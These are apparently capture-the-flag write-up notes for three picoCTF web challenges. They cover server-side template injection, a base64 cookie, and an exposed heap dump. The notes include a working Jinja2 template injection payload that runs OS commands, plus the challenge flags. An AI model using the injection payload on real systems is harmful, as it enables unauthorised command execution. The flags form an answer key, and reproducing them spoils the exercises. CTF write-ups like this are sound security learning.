## SSTI
- tried few payloads: `{7*'7'}`
- `{{7*7}}` worked, tested for python functions `{{"ABC".lower()}}`
- Ran os command: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
- Cat flag: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`

## Cookie Monster Secret Recipe

- http://verbal-sleep.picoctf.net:56241/ opened with a login page
- tried default credentials
- Checked the cookie
- base64 string: `cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ==`
```sh
echo cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ== | base64 -d
> picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}%
```

## Head Dump
- Explore the website
- API Doc url: `http://verbal-sleep.picoctf.net:52012/api-docs/`
- Memory dump url: `http://verbal-sleep.picoctf.net:52012/api-docs/#/Diagnosing/get_heapdump`
- Find flag: `grep picoCTF <headdump file`
- 